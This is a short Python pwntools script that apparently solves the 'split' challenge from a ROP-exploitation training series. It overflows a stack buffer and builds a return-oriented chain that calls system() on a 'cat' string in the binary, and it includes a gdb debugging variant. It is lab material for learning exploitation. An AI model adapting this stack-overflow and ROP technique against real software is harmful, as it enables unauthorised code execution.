#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-03-01 05:47:11
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *

context.arch = "amd64"

filename = "./split"
target_binary = ELF(filename)
target_process = process(filename)


def exploit():
    exploit_rop = ROP(target_binary)
    target_process.recvuntil(b">")
    trash = cyclic(0x20 + 0x8)
    cat_string_address = 0x00601060
    call_system_address = 0x0040074b
    exploit_rop(rdi=cat_string_address)
    exploit_rop.raw(call_system_address)
    chain = exploit_rop.chain()
    log.info(f"exploit_rop: ")
    print(exploit_rop.dump())
    target_process.send(trash + chain)
    target_process.interactive()


def debug():
    gdbscript = """
    break *0x00400735
    start
    continue
    """
    gdb.attach(target_process, gdbscript=gdbscript)
    target_process.recvuntil(b">")
    trash = cyclic(0x20 + 0x8)
    cat_string_address = 0x00601060
    call_system_address = 0x0040074b
    debug_rop = ROP(target_binary)
    debug_rop(rdi=cat_string_address)
    debug_rop.raw(call_system_address)
    chain = debug_rop.chain()
    log.info(f"debug_rop: ")
    print(debug_rop.dump())
    target_process.send(trash + chain)


if __name__ == "__main__":
    # debug()
    exploit()

